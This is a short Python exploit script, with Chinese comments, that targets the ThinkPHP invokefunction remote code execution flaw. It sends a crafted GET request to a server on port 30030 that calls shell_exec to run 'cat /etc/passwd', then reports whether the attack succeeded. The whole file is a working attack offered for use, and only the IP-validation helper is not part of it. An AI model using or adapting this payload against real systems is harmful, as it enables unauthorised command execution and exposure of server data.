import requests
import socket


# 这个方法用来检查ip地址是否合法
def is_valid_ip(address):
    try:
        socket.inet_aton(address)
        return True
    except:
        return False


# 这个方法用来发送恶意请求
def send_request(server):
    url = f"http://{server}:30030/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=bash -c \"cat /etc/passwd\""
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print("\033[92m>>远程代码执行请求执行成功\033[0m")
        else:
            print("\033[91m>>远程代码执行请求执行失败\033[0m")
    except requests.exceptions.RequestException as e:
        print("\033[91m>>执行失败: ", e, "\033[0m")


